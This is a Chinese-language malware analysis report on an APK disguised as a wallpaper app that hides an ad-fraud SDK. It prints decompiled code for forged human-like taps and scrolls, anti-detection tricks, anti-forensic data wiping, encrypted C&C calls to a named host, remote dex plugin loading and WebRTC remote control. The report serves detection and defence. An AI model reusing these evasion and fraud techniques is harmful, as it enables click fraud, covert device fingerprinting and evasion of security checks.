# APK 逆向分析报告：testBQ_nv_0915.apk

## 一、基本信息

| 属性 | 值 |
|---|---|
| **文件名** | testBQ_nv_0915.apk |
| **文件大小** | 5,071,571 字节 (4.8 MB) |
| **包名** | `com.android.wallpaper` (伪装成壁纸应用) |
| **主Activity** | `com.nied.MainActivity` |
| **SDK版本** | minSdk=24, targetSdk=34 |
| **版本号** | versionCode=34, versionName="14" |
| **内部SDK名称** | **DllpgdLiteSDK** / **H5Lite** |
| **内部版本** | 2.0.1 (release) |
| **DEX文件** | 单一 classes.dex (9.4MB, 2905个类) |
| **权限** | `INTERNET`, `ACCESS_NETWORK_STATE` |
| **签名** | APK Signing Block |

## 二、性质判定

**广告欺诈 / 点击欺诈 SDK (Ad Fraud / Click Fraud)**

该 APK 伪装为系统壁纸应用，内嵌一个名为 DllpgdLiteSDK 的广告欺诈框架。核心行为是在隐藏的 WebView 中加载广告页面，通过程序化生成高仿真触摸手势（点击、滑动）实施广告点击欺诈，同时支持通过 WebRTC 信令进行实时远程控制。

## 三、架构总览

```
MainActivity.onCreate()
    └── Kucopd.init(context, "n3Hza")       ← SDK入口，"n3Hza"为渠道标识
         └── new Thread().start()            ← 新线程启动，避免阻塞UI
              ├── 1. 进程检查 — 验证当前进程名与包名一致
              ├── 2. 冷却检查 — 6小时内不重复执行
              ├── 3. 设备指纹收集 (Atom)
              ├── 4. 初始化日志/事件上报系统
              ├── 5. 连接C&C服务器获取配置 (DllpgdConfig)
              ├── 6. 创建隐藏WebView (主线程)
              ├── 7. 网络连接检查
              ├── 8. 建立信令通道 (WebSocket/HTTP轮询)
              ├── 9. 检查信令插件启动 (CheckSignalingPluginStart)
              ├── 10. 注入加密JavaScript + 加载目标URL
              ├── 11. 模拟点击/滑动手势
              └── 12. Timer定时器 — 每30分钟重复任务
```

## 四、核心恶意功能详细分析

> 详见下方各节的深入分析

### 4.1 触摸事件伪造

详见 [第五节：触摸事件伪造详细分析](#五触摸事件伪造详细分析)

### 4.2 WebView 自动化

详见 [第六节：WebView 自动化详细分析](#六webview-自动化详细分析)

### 4.3 C&C 通信协议

详见 [第七节：C&C 通信协议详细分析](#七cc-通信协议详细分析)

### 4.4 WebRTC 信令 — 实时远程控制

详见 [第八节：WebRTC 信令详细分析](#八webrtc-信令--实时远程控制详细分析)

## 五、触摸事件伪造详细分析

### 5.1 核心类概览

触摸事件伪造系统由两个核心类组成：

| 类 | 路径 | 职责 |
|---|---|---|
| `MotionHelper` | `com/nied/MotionHelper.java` | 构造并分发伪造的 MotionEvent |
| `RandomHelper` | `com/nied/RandomHelper.java` | 提供高精度随机数生成 |

### 5.2 点击事件伪造 — `clickViewExact(Point)`

**核心方法** (`MotionHelper.java:45-70`)

```java
public String clickViewExact(Point point) {
    long currentTimeMillis = System.currentTimeMillis();
    int duration = RandomHelper.getRandomInt(60, 160);  // 按下持续时间 60-160ms
    long upTime = currentTimeMillis + duration;

    // 坐标微扰 — 模拟人手抖动
    if (RandomHelper.getRandomFloat() < 0.75d) {
        // 75% 概率：小偏移 ±1px
        offsetX = RandomHelper.getRandomInt(-1, 1);
        offsetY = RandomHelper.getRandomInt(-1, 1);
    } else {
        // 25% 概率：大偏移 ±3px
        offsetX = RandomHelper.getRandomInt(-2, 3);
        offsetY = RandomHelper.getRandomInt(-2, 3);
    }

    // DOWN 和 UP 的坐标分别加上亚像素随机浮点
    fArr[0] = {point.x + RandomHelper.getRandomFloat(), point.y + RandomHelper.getRandomFloat()};
    fArr[1] = {point.x + offsetX + RandomHelper.getRandomFloat(), point.y + offsetY + RandomHelper.getRandomFloat()};

    // 构造 MotionEvent
    MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, ACTION_DOWN, ...);
    MotionEvent upEvent = MotionEvent.obtain(downTime, upTime, ACTION_UP, ...);

    // 直接通过 View.dispatchTouchEvent() 分发，绕过 InputManager
    this.mView.dispatchTouchEvent(downEvent);
    this.mView.dispatchTouchEvent(upEvent);
}
```

**关键设计意图：**
- **坐标微扰**：75%/25% 的双层偏移分布，模拟真实人手点击时的微小抖动
- **亚像素精度**：每个坐标额外加 `getRandomFloat()` (0.0~1.0)，产生浮点坐标
- **时间随机化**：按下持续时间 60-160ms，符合真人点击的时间分布
- **绕过 isTrusted**：通过 `View.dispatchTouchEvent()` 而非 `Instrumentation.sendPointerSync()` 分发事件

### 5.3 另一种点击 — `clickViewByPoint(float, float)`

(`MotionHelper.java:72-77`, `329-345`)

此方法生成更复杂的多事件点击序列：

```
60% 概率 → 2个事件 (DOWN + UP)
40% 概率 → 3~4个事件 (DOWN + MOVE... + UP)
```

多事件模式中间插入 `ACTION_MOVE` 事件，模拟手指在屏幕上微移的自然行为。

### 5.4 滚动手势伪造 — 贝塞尔曲线路径

(`MotionHelper.java:347-375`)

滚动轨迹通过**二次贝塞尔曲线**生成，而非简单的直线插值：

```java
// 计算转折点（控制点），引入随机性
turningPoint.x = start.x + ((end.x - start.x) * randomInt(2500, 3500)) / 10000.0f;
turningPoint.y = start.y + ((end.y - start.y) * randomInt(5000, 7500)) / 10000.0f;

// 使用 Android Path API 构造贝塞尔曲线
Path path = new Path();
path.moveTo(start.x, start.y);
path.quadTo(turningPoint.x, turningPoint.y, end.x, end.y);  // 二次贝塞尔

// 通过 PathMeasure 均匀采样曲线上的点
PathMeasure pathMeasure = new PathMeasure(path, false);
float length = pathMeasure.getLength();
for (int i = 0; i < numPoints; i++) {
    pathMeasure.getMatrix((i * length) / (numPoints - 1), matrix, 1);
    // 每个采样点再加 1-10px 随机偏移
    points[i] = {matrix.x + randomInt(1, 10), matrix.y + randomInt(1, 10)};
}
```

**贝塞尔控制点参数：**
- X轴控制点位置：总距离的 25%~35% 处
- Y轴控制点位置：总距离的 50%~75% 处
- 每个采样点额外加 1~10px 随机噪声

### 5.5 滚动行为模式

| 方法 | 行为 | 方向偏好 |
|---|---|---|
| `randomScroll(n, listener)` | 滚动 n 次 | 85% 向上, 15% 向下 |
| `randomScrollWithDur(sec, listener)` | 滚动指定秒数 | 90% 向上, 10% 向下 |
| `scroll2Bottom(listener)` | 滚动到页面底部 | 90% 向上, 10% 回退 |
| `scroll2Y(targetY, listener)` | 滚动到指定Y坐标 | 智能方向判断 |
| `scroll2BottomOrContentChange(listener)` | 滚动到底部或内容变化时停止 | 95% 向上, 5% 回退 |

**关键设计**：所有滚动方法都混入少量反方向滚动（回退），模拟真人浏览时的"来回看"行为。

### 5.6 触摸压力模拟

(`MotionHelper.java:417-429`)

压力值采用**四段分布**模型：

```
┌─────────────────────────────────────────────────┐
│  90% → [0.15, 0.35]   (正常轻触)                │
│  ├─ 剩余10%中:                                  │
│  │  80% → [0.10, 0.15]  (极轻触摸)              │
│  │  或 [0.35, 0.50]     (稍重触摸)              │
│  └─ 20% → [0.50, 1.00]  (重按)                  │
└─────────────────────────────────────────────────┘
```

精度高达 10^14 ~ 10^17 位小数（由 `RandomHelper.getRandomDouble()` 实现），使得压力值几乎不可能重复。

### 5.7 PointerCoords 九轴模拟

(`MotionHelper.java:431-445`)

每个触摸点设置 9 个轴值，完整模拟真实触摸屏传感器数据：

| 轴 (Axis) | 索引 | 含义 | 值来源 |
|---|---|---|---|
| `AXIS_X` | 0 | X坐标 | 目标坐标 + 随机偏移 |
| `AXIS_Y` | 1 | Y坐标 | 目标坐标 + 随机偏移 |
| `AXIS_PRESSURE` | 2 | 压力 | 四段分布随机值 |
| `AXIS_SIZE` | 3 | 触摸面积 | 由压力值派生 |
| `AXIS_TOUCH_MAJOR` | 4 | 触摸椭圆长轴 | 由面积派生 |
| `AXIS_TOUCH_MINOR` | 5 | 触摸椭圆短轴 | 由面积派生 |
| `AXIS_TOOL_MAJOR` | 6 | 工具椭圆长轴 | 等于 TOUCH_MAJOR |
| `AXIS_TOOL_MINOR` | 7 | 工具椭圆短轴 | 等于 TOUCH_MINOR |
| `AXIS_ORIENTATION` | 8 | 方向角 | 固定为 0.0 |

压力、面积、椭圆轴之间的派生关系 (`getPointerCoordsValue`, 行 447-485)：
- `size = pressure / (touchSize ± random)` — 面积与压力成正比
- `touchMajor` 和 `touchMinor` 由面积进一步派生
- 接触尾部最后几个点 (由 `randomInt3` 控制) 压力会微减，模拟手指抬起过程

### 5.8 时间戳模拟

(`MotionHelper.java:487-532`)

**滚动事件时间戳** (含加速/减速):
```
70% 概率 → 间隔 10-40ms (快速段)
30% 概率 → 间隔 50-100ms (慢速段)
```

支持加速度模式 (`boolean z` 参数)：
- 开始时间间隔较短（加速阶段）
- 结束时最后一个事件间隔 5-50ms（减速阶段）

**点击事件时间戳**：
```
2事件: DOWN=t, UP=t+[40,150]ms
3事件: DOWN=t, MOVE=t+[40,150]ms, UP=MOVE+[8,10]ms
4事件: DOWN=t, MOVE1=t+[40,150]ms, MOVE2..UP间隔各[5,50]ms
```

### 5.9 事件分发机制

(`MotionHelper.java:259-292`)

```java
private void sendMotionEvent(View view, MotionEvent[] events) {
    // 根据 View 在窗口中的位置选择 Handler
    int[] location = new int[2];
    view.getLocationInWindow(location);
    Handler handler = (location[0] == 0 || location[1] == 0)
        ? this.mHandler       // 使用主线程 Handler (View 不可见时)
        : view.getHandler();  // 使用 View 自己的 Handler

    for (MotionEvent event : events) {
        // 按事件时间戳差值延迟分发，模拟真实时序
        handler.postDelayed(() -> {
            view.dispatchTouchEvent(event);
        }, event.getEventTime() - event.getDownTime());
    }
}
```

**关键细节：**
- 设备ID固定为 `4`（`getEventDeviceId()` 返回 4）
- 输入源设为 `SOURCE_TOUCHSCREEN` (0x1002)
- `toolType` 设为 `1` (TOOL_TYPE_FINGER)
- 当 View 不在窗口可见区域时（位置为 0,0），使用主线程 Handler 而非 View Handler
- 事件通过 `dispatchTouchEvent()` 直接分发到 WebView，不经过系统 InputManager

### 5.10 反检测总结

| 维度 | 技术 | 效果 |
|---|---|---|
| **坐标** | 双层偏移分布 + 亚像素浮点 | 每次点击坐标不完全相同 |
| **轨迹** | 贝塞尔曲线 + 路径采样噪声 | 滚动路径非线性，类似人手 |
| **时间** | 多段随机分布 + 加速/减速模型 | 时间间隔符合人类操作节奏 |
| **压力** | 四段概率分布 + 10^17精度 | 压力值几乎不可能重复 |
| **传感器** | 9轴完整模拟 | 通过触摸屏传感器完整性检查 |
| **行为** | 混入反方向滚动 | 模拟真人"来回浏览"习惯 |
| **分发** | `dispatchTouchEvent()` | 绕过系统级事件注入检测 |

## 六、WebView 自动化详细分析

### 6.1 系统架构

WebView 自动化系统位于混淆包 `lIllIlIll1` 中，由以下组件构成：

| 文件 | 功能角色 |
|------|---------|
| `llllIIIIll1.java` | 抽象基类 — WebView 引擎核心，包含 WebSettings、JS Bridge、WebViewClient/WebChromeClient、触摸模拟、反取证清理 |
| `IlIllIlllIllI1.java` | JS Bridge 接口定义 (`@JavascriptInterface` 方法声明) |
| `IlIlllIIlI1.java` | 任务编排器 — 从 C2 获取任务配置、创建 WebView 实例、分发信令/非信令任务 |
| `IllIIlIIII1.java` | 信令模式任务实现 (extends `llllIIIIll1`)，支持 `UpdateSignalingStatus` 上报 |
| `llllIllIl1.java` | 非信令模式任务实现 (extends `llllIIIIll1`)，带屏幕截图和回调完成机制 |
| `lIIIIlllllIlll1.java` | 滑动/滚动触摸模拟器 — 通过贝塞尔曲线路径 + `AccelerateDecelerateInterpolator` 模拟人类滑动 |

### 6.2 WebView 配置 — 全权限开放

**文件**: `lIllIlIll1/llllIIIIll1.java:498-513`

```java
settings.setMixedContentMode(0);                    // MIXED_CONTENT_ALWAYS_ALLOW
settings.setJavaScriptEnabled(true);                 // 启用 JavaScript
settings.setCacheMode(-1);                           // LOAD_DEFAULT
settings.setMediaPlaybackRequiresUserGesture(false); // 无需用户手势即可自动播放
settings.setDomStorageEnabled(true);                 // 启用 DOM 存储
settings.setUseWideViewPort(true);                   // 宽视口
settings.setLoadWithOverviewMode(true);              // 概览模式
settings.setAllowFileAccess(true);                   // 允许文件访问
settings.setAllowContentAccess(true);                // 允许内容访问
settings.setAllowFileAccessFromFileURLs(true);       // 允许 file:// 访问本地文件
settings.setAllowUniversalAccessFromFileURLs(true);  // 允许 file:// 跨域访问
settings.setMediaPlaybackRequiresUserGesture(false); // 重复设置确保自动播放
```

**安全隐患**：
- `MIXED_CONTENT_ALWAYS_ALLOW`：完全放开混合内容限制
- `AllowFileAccessFromFileURLs` + `AllowUniversalAccessFromFileURLs`：在 Android 4.1+ 默认为 `false`，此处显式开启，赋予 file:// scheme 完整跨域能力
- `setLayerType(2, null)` (行 522)：启用硬件加速渲染

### 6.3 JavaScript 注入机制

#### 6.3.1 JS Bridge 注册与注销

**注册** (`llllIIIIll1.java:521`)：
```java
this.f508llllIIIIll1.addJavascriptInterface(this, this.f502IllIIlIIII1);
```

Bridge 对象名通过 XOR 加密字符串运行时解密。JavaScript 代码通过 `window.<bridge_name>` 访问原生方法。

**注销** (清理阶段, 行 122-127)：
```java
lllliiiill1.f508llllIIIIll1.removeJavascriptInterface(lllliiiill1.f502IllIIlIIII1);
```

#### 6.3.2 动态 JS 注入

**内部类 `IlIllIlllIllI1`** (行 136-150) 在页面加载完成后通过 `evaluateJavascript` 注入控制脚本：

```java
webView.evaluateJavascript(
    XOR_DECRYPT(前缀)           // JS 函数包装开头
    + this.f509llllIllIl1       // C2 下发的动态 JS 脚本
    + XOR_DECRYPT(后缀),        // JS 闭包结束
    null);
```

注入模式为：**前缀(函数包装)** + **C2 下发的动态脚本** + **后缀(闭包结束)**。

#### 6.3.3 预编译大型 JS 脚本

字段 `f493lllIlIIIlI1` (行 52-60) 是一个数千字节的加密字节数组，通过静态初始化块解密，包含完整的页面元素定位、广告交互等自动化控制逻辑。

### 6.4 JS Bridge 接口方法 (@JavascriptInterface)

**接口**: `lIllIlIll1/IlIllIlllIllI1.java`
**实现**: `lIllIlIll1/llllIIIIll1.java`

| 方法 | 功能 | 行号 |
|------|------|------|
| `touch(float, float)` | **模拟点击** — 在指定坐标位置模拟触摸事件 | 417-424 |
| `scroll(f,f,f,f,long)` | **模拟滑动** — 贝塞尔曲线滑动，带持续时间 | 389-396 |
| `screenshot()` | **截图** — 返回 Base64 编码的 PNG 图像 | 364-387 |
| `done(String)` | **任务完成** — 通知原生端任务完成，触发清理 | 315-330 |
| `getConfig()` | 返回 C2 下发的任务配置 JSON | 332-336 |
| `setConfig(String, String)` | 更新任务配置 | 398-409 |
| `getGAID()` | 获取 Google Advertising ID | 338-342 |
| `getTime()` / `setTime(long)` | 获取/设置累计执行时间 | 344-348 / 411-415 |
| `isSignaling()` | 查询是否处于信令模式 | 350-354 |
| `updateSignalStatus(int)` | 更新信令状态 (IN_LANDING 等) | 426-430 |
| `upload_event(String)` | **事件上报** — JS 端事件加入上传队列 | 432-440 |
| `upload_log(String)` | **日志上报** — JS 端日志加入上传队列 | 442-450 |
| `back()` | 调用 `WebView.goBack()` 后退 | 294-300 |
| `debugLog(String)` | 将 JS 端日志传递到原生日志系统 | 302-307 |

**截图机制** (行 366-387)：以 PNG 格式压缩 (quality=100, 无损)，Base64 编码 (NO_WRAP) 返回给 JS 端。

### 6.5 请求拦截 / 代理行为

**内部类**: `IlIlllIIlI1 extends WebViewClient` (行 594-763)

#### 路径 A：本地资源服务 (行 561-592)

当 URL 包含特定标识时，从应用 `filesDir` 目录加载本地文件：
- `.js` → `application/javascript`
- `.css` → `text/css`
- 其他 → `application/octet-stream`
- 不存在时返回空 404 响应

#### 路径 B：代理请求 (行 602-655)

当代理模式标志位 `f504lIllIIIlIl1` 为 `true` 时激活：

1. 通过正则匹配请求路径
2. 非主框架的子资源请求被拦截
3. 通过原生 `HttpsURLConnection` 发起代理请求（超时 8000ms）
4. **响应注入**：所有符合条件的响应体末尾追加 C2 控制的 JavaScript 代码

```java
String str5 = responseBody + separator + this.f509llllIllIl1;  // 追加C2下发JS
return new WebResourceResponse(mimeType, "utf-8", new ByteArrayInputStream(str5.getBytes()));
```

### 6.6 WebChromeClient 行为

**内部类 `IllIIlIIII1 extends WebChromeClient`** (行 152-170)：

- `onConsoleMessage()` 始终返回 `true`，**静默吞没所有 console.log/error 输出**，阻止其写入 logcat
- `onProgressChanged()` 仅记录 DEBUG 级别日志

### 6.7 任务执行模型

#### 初始化链 (`IlIlllIIlI1.llllIllIl1.java:327-390`)

```
1. 设置 WebView DataDirectorySuffix (Android 9+)
2. 初始化应用上下文
3. 检查运行环境 (isMainProcess)
4. 初始化信令连接
5. 发送 CheckSignalingPluginStart 请求
6. 清理 WebView 缓存/Cookie
7. UI线程创建 WebView 实例
8. sleep(2000ms) 等待初始化
9. 创建任务编排器执行首次任务
10. Timer 每 30 分钟重复执行
```

#### 任务编排 (`lIllIlIll1/IlIlllIIlI1.java:87-109`)

```
1. 从 C2 获取认证令牌
2. 判断信令/非信令模式：
   - 信令模式 → 获取信令 JS + 信令配置 → new IllIIlIIII1(...)
   - 非信令模式 → 获取普通 JS + 普通配置 → new llllIllIl1(...)
3. UI 线程执行 lIllIIIlIl1() 初始化
```

#### 页面加载与 JS 执行时序

```
loadUrl(目标URL)
   → onPageStarted: 记录加载开始时间
   → onPageFinished: 累计加载时间 → 触发 evaluateJavascript(C2下发JS)
      → JS 通过 Bridge 调用 touch()/scroll()/screenshot()
      → JS 通过 Bridge 上报 upload_event()/upload_log()
      → JS 任务完成 → done() → 清理WebView → 链式启动下一任务
```

#### 链式执行机制

非信令模式完成回调调用 `llllIllIl1()` (行 232-245)，创建全新 WebView 实例并启动新任务，实现**任务完成后自动启动下一轮的循环机制**。

### 6.8 定期数据上报

**内部类 `llllIllIl1 extends TimerTask`** (行 214-242)：

```java
this.f506llIIIIlIlllIII1.schedule(new llllIllIl1(), 1000L, 4000L);
// 首次延迟1秒，之后每4秒执行
```

每次执行：
1. 事件队列不为空时批量上传到 C2
2. 每 8 个周期 (~32秒)，日志队列不为空时批量上传

### 6.9 反取证清理 — 全面数据销毁

**方法**: `llllIllIl1()` (行 534-551)

```java
this.f508llllIIIIll1.clearCache(true);                    // 清除所有缓存(含磁盘)
this.f508llllIIIIll1.clearHistory();                      // 清除浏览历史
this.f508llllIIIIll1.clearFormData();                     // 清除表单数据
this.f508llllIIIIll1.clearSslPreferences();               // 清除SSL偏好
CookieManager.getInstance().removeSessionCookies(null);   // 删除会话Cookie
CookieManager.getInstance().removeAllCookies(null);       // 删除所有Cookie
WebViewDatabase.getInstance(...).clearHttpAuthUsernamePassword(); // 清除HTTP认证
WebStorage.getInstance().deleteAllData();                  // 清除所有Web存储
```

**触发时机**：每次新任务开始前以 **92% 的概率**执行 (行 526-528)。覆盖了 WebView 所有持久化存储，使取证分析几乎无法恢复任何访问痕迹。

### 6.10 click_test.html — 调试验证页

**文件**: `assets/click_test.html`

开发/测试用页面，用于验证触摸模拟效果：

```javascript
document.addEventListener('click', function (event) {
    console.log("Click position:");
    console.log("  clientX/clientY:", event.clientX, event.clientY);
    console.log({ isTrusted: event.isTrusted, ... });
    if (window.AndroidInterface) {
        window.AndroidInterface.onClick(event.clientX, event.clientY);
    }
});
```

特别关注 `event.isTrusted` 属性，表明开发者重点验证模拟事件能否通过 `isTrusted` 检测。

## 七、C&C 通信协议详细分析

### 7.1 多层加密管道

所有 C&C 通信数据经过五层嵌套加密处理。核心代码在 `HttpGatewayClient.callAPI()` 方法中一行完成：

**文件**: `c13/nim5/ez8/h5_proto/HttpGatewayClient.java:242-246`

```java
return new JSONObject(new String(sendHttpRequest(str,
    aesEncryptString(
        Base64.encodeToString(
            gzipCompress(jSONObject2.getBytes("UTF-8")),
        2)
    ).getBytes("UTF-8")
), "UTF-8"));
```

**加密流程（发送方向）**:

| 层级 | 操作 | 说明 |
|------|------|------|
| 第1层 | `JSON → byte[]` | JSON 对象序列化为 UTF-8 字节数组 |
| 第2层 | `GZIP 压缩` | `GZIPOutputStream` 数据压缩 |
| 第3层 | `Base64 编码` | flag=2 (NO_WRAP 模式，无换行) |
| 第4层 | `AES-256-CFB 加密` | MD5 派生密钥，随机 16 字节 IV，NoPadding |
| 第5层 | `Base64 编码` | 再次 Base64 生成可传输 ASCII |

另有 `callAPIPlaintext` 方法 (行 248-252) 可绕过加密直接发送明文，可能用于调试。

### 7.2 AES-256-CFB 加密实现

#### 密钥派生

```
XOR解密(8字节密文, 8字节密钥) → 原始字符串 → MD5(原始字符串) → 大写HEX(32字符) → AES-256密钥
```

**MD5 哈希函数** (`IlIlIIIlIlIlll1/IIlIllIIll1.java:295-310`)：

```java
public static String IlIllIlllIllI1(String str) {
    byte[] digest = MessageDigest.getInstance("MD5").digest(str.getBytes());
    StringBuilder sb = new StringBuilder();
    for (byte b : digest) {
        String hexString = Integer.toHexString(b & 0xFF);
        if (hexString.length() == 1) sb.append('0');
        sb.append(hexString);
    }
    return sb.toString().toUpperCase(Locale.getDefault());
}
```

输出大写 32 字符 HEX 字符串，正好 32 字节用作 AES-256 密钥。

#### 加密过程 (`HttpGatewayClient.java:166-202`)

```java
// 1. MD5 哈希 AES_KEY 得到 hex 字符串
String md5Key = IIlIllIIll1.IlIllIlllIllI1(AES_KEY);
byte[] keyBytes = md5Key.getBytes("UTF-8");  // 32字节

// 2. 创建 AES 密钥
SecretKeySpec secretKeySpec = new SecretKeySpec(keyBytes, "AES");

// 3. 生成 16 字节随机 IV
byte[] iv = new byte[16];
new SecureRandom().nextBytes(iv);

// 4. AES/CFB/NoPadding 加密
Cipher cipher = Cipher.getInstance("AES/CFB/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, secretKeySpec, new IvParameterSpec(iv));
byte[] encrypted = cipher.doFinal(plaintext);

// 5. IV || 密文 拼接 → Base64
byte[] result = new byte[16 + encrypted.length];
System.arraycopy(iv, 0, result, 0, 16);            // 前16字节 = IV
System.arraycopy(encrypted, 0, result, 16, ...);   // 后续 = 密文
return Base64.encodeToString(result, 2);
```

#### 解密过程 (行 42-76)

解密为加密的逆过程：从输入数据前 16 字节提取 IV，剩余数据为 AES 密文，使用相同密钥 + IV 解密。

### 7.3 XOR 字符串加密

**文件**: `IllIIlIIII1/llllIIIIll1.java`

```java
public static byte[] lIIIIlllllIlll1(byte[] bArr, byte[] bArr2) {
    int length = bArr.length;      // 密文长度
    int length2 = bArr2.length;    // 密钥长度 (固定8字节)
    int i = 0, i2 = 0;
    while (i < length) {
        if (i2 >= length2) i2 = 0;              // 密钥索引回绕
        bArr[i] = (byte) (bArr[i] ^ bArr2[i2]); // 逐字节XOR
        i++; i2++;
    }
    return bArr;
}
```

- **算法**: 循环密钥 XOR (Repeating-key XOR)
- **密钥长度**: 固定 **8 字节**
- **使用范围**: 所有敏感字符串（API 端点、HTTP 头、JSON 键名、加密算法名等）
- **入口**: `IllIIlIIII1.f243llllIIIIll1` 单例实例，全局访问

### 7.4 API 端点

| 接口 | 功能 | 完整路径 | 请求格式 | 响应格式 |
|------|------|----------|----------|----------|
| `getConfig` | 获取远程配置 | `/api/v1/dllpgd/getConfig` | `{"atom": <Atom>}` | `GetConfigResponse` (code/message/dllpgdConfig) |
| `updateEvent` | 上报事件 | `/api/v1/dllpgd/updateEvent` | `UpdateEventRequest` (atom + events[]) | `CommonResponse` (code/message) |
| `updateLog` | 上报日志 | `/api/v1/dllpgd/updateLog` | `UpdateLogRequest` (atom + log[]) | `CommonResponse` (code/message) |

端点路径均通过 XOR 加密存储，运行时解密后拼接到基础 URL `http://dllpgd.click`。

### 7.5 设备指纹 (Atom) 结构

**文件**: `c13/nim5/ez8/h5_proto/Atom.java`

```json
{
    "deviceId": "",                   // UUID生成，持久化到SharedPreferences
    "deviceInfo": {
        "timezone": "",               // 时区
        "locale": "",                 // 语言/地区
        "phoneTimestamp": 0,          // 手机当前时间戳
        "phoneModel": "",             // 手机型号 (Build.MODEL)
        "androidVersion": ""          // Android版本 (Build.VERSION.RELEASE)
    },
    "version": 0,                     // 协议版本号
    "appPackageName": "",             // 应用包名
    "appVersion": "",                 // 应用版本
    "gaId": "",                       // Google Advertising ID
    "sessionId": "",                  // 服务器分配的会话ID
    "appChannel": "",                 // 应用渠道 (如 "n3Hza")
    "pluginInfos": [],                // 已安装插件信息列表
    "isGeneratedBySubProcess": false  // 是否子进程生成
}
```

设备 ID 通过 `UUID.randomUUID()` 生成，去除连字符后持久化。GAID 通过反射调用 `AdvertisingIdClient.getAdvertisingIdInfo()` 获取。

### 7.6 DllpgdConfig 远程配置

**文件**: `c13/nim5/ez8/h5_proto/DllpgdConfig.java`

```json
{
    "plugins": [<PluginInfo>],                     // 远程插件列表
    "sessionId": "",                                // 会话标识
    "hookPkgNameStackTraces": ["java.lang..."],    // 反Hook检测堆栈特征
    "hookPackageManagerStackTraces": ["com..."],    // PackageManager Hook检测
    "fixPackageName": ""                            // 检测到Hook时使用的替代包名
}
```

### 7.7 插件系统

#### PluginInfo 结构 (`c13/nim5/ez8/h5_proto/PluginInfo.java`)

| 字段 | 类型 | 说明 |
|------|------|------|
| `url` | String | 插件下载 URL |
| `md5` | String | MD5 校验值 |
| `className` | String | 入口类全限定名 (DexClassLoader) |
| `password` | String | AES-ECB 解密密码 |
| `needRun` | boolean | 是否需要运行 |
| `needUpdate` | boolean | 是否需要更新 |
| `delayRunSeconds` | int | 延迟运行秒数 |
| `endDelete` | boolean | 运行后删除 |
| `runInSubProcess` | boolean | 子进程运行 |

#### 插件生命周期

```
1. getConfig() → 从 C&C 获取 DllpgdConfig.plugins[]
2. 检查 needUpdate → 判断是否下载/更新
3. HTTP 下载 → 从 url 下载加密 .dex 文件 (超时 30s/35s)
4. AES-ECB 解密 → 使用 password 作为密钥，AES/ECB/PKCS5Padding
5. MD5 校验 → 解密后内容 MD5 与 md5 字段对比（仅警告，不中断）
6. DexClassLoader 加载 → 通过 className 加载入口类
7. 延迟执行 → 根据 delayRunSeconds
8. 清理 → 根据 endDelete 决定运行后是否删除
```

### 7.8 事件与日志上报格式

**Event 结构** (`c13/nim5/ez8/h5_proto/Event.java`)：

```json
{"timestamp": 1234567890, "name": "event_name", "desc": "description"}
```

**Log 结构** (`c13/nim5/ez8/h5_proto/Log.java`)：

```json
{"timestamp": 1234567890, "level": "ERROR", "tag": "module_tag", "message": "content"}
```

LogLevel 枚举: DEBUG=0, INFO=1, WARN=2, ERROR=3

### 7.9 HTTP 请求配置

```java
httpURLConnection.setRequestMethod("POST");
httpURLConnection.setRequestProperty("Content-Type", "application/json");     // XOR解密结果
httpURLConnection.setRequestProperty("User-Agent", "DllpgdLiteClient/2.0");  // XOR解密结果
httpURLConnection.setRequestProperty("Content-Length", String.valueOf(length));
httpURLConnection.setConnectTimeout(10000);  // 连接超时 10s
httpURLConnection.setReadTimeout(30000);     // 读取超时 30s
```

完整 URL 构成: `http://dllpgd.click` + `/api/v1/dllpgd/{endpoint}`

### 7.10 环境检测（反分析）

**文件**: `IlIlIIIlIlIlll1/IIlIllIIll1.java`

运行条件必须同时满足：
- 必要类存在检查
- 未检测到 Hook 框架 (Xposed/Frida)
- API Level >= 33 (Android 13+)
- `Runtime.availableProcessors() >= 4`（至少 4 核 CPU）

### 7.11 加密体系架构

```
┌───────────────────────────────────────┐
│  C&C 通信层 — AES-256-CFB            │  随机IV，MD5派生密钥，NoPadding
│  JSON → GZIP → Base64 → AES → Base64 │
├───────────────────────────────────────┤
│  插件解密层 — AES-ECB                 │  password密钥，PKCS5Padding
│  下载 → AES-ECB解密 → MD5校验 → 加载  │
├───────────────────────────────────────┤
│  字符串混淆层 — XOR                   │  8字节循环密钥
│  所有敏感字符串运行时解密              │
├───────────────────────────────────────┤
│  本地存储层 — AES-ECB                 │  Base64编码密钥
│  SharedPreferences 数据加密            │
└───────────────────────────────────────┘
```

## 八、WebRTC 信令 — 实时远程控制详细分析

### 8.1 系统架构

```
+---------------------------------------------------+
|  远程控制端 (C&C 服务器 / Web 端)                   |
+---------------------------------------------------+
          |                    |
    HTTP 轮询层           WebSocket 层
   (Plugin检查)          (信令通道)
          |                    |
+---------------------------------------------------+
|  信令协议层 (Protobuf-like JSON)                    |
|  SignalingRequest / SignalingResponse               |
+---------------------------------------------------+
          |                    |
    SDP/ICE 协商         控制命令下发
          |                    |
+---------------------------------------------------+
|  WebRTC 层 (PeerConnection + DataChannel)           |
|  视频流上行 + 数据通道双向通信                       |
+---------------------------------------------------+
          |
+---------------------------------------------------+
|  设备端执行层                                       |
|  WebView 截屏/VirtualDisplay + 触摸/滚动/输入注入    |
+---------------------------------------------------+
```

**关键文件映射**：

| 逻辑角色 | 文件路径 |
|---------|---------|
| WebRTC 主控制器 | `llIIIIlIlllIII1/IllIIlIIII1.java` |
| VirtualDisplay 截屏器 | `llIIIIlIlllIII1/llllIllIl1.java` |
| Bitmap 截屏器 (备用) | `llIIIIlIlllIII1/llllIIIIll1.java` |
| 视频解码器工厂 | `llIIIIlIlllIII1/lIIIIlllllIlll1.java` |
| WebSocket 抽象基类 | `llIIllIl1/llllIIIIll1.java` |
| 信令协议定义 | `c13/nim5/ez8/h5_proto/signaling/` |

### 8.2 信令协议消息体系

#### SignalingRequest (客户端 → 服务端)

```java
public class SignalingRequest {
    private final Atom atom;       // 设备指纹
    private final Content content; // 消息内容 (5种子类型)
}
```

| 子类型 | 描述 |
|--------|------|
| `Content.SdpOffer` | 携带 SDPOffer 对象 |
| `Content.SdpAnswer` | 携带 SDPAnswer 对象 |
| `Content.IceCandidate` | 携带 ICECandidate 对象 |
| `Content.Control` | 携带 ControlCommand 远控命令 |
| `Content.PingMessage` | 心跳请求 |

#### SignalingResponse (服务端 → 客户端)

| 子类型 | 描述 |
|--------|------|
| `Content.SdpOffer` | 远端 SDP Offer |
| `Content.SdpAnswer` | 远端 SDP Answer |
| `Content.IceCandidate` | 远端 ICE 候选 |
| `Content.Status` | 连接状态通知 |
| `Content.PongMessage` | 心跳响应 |
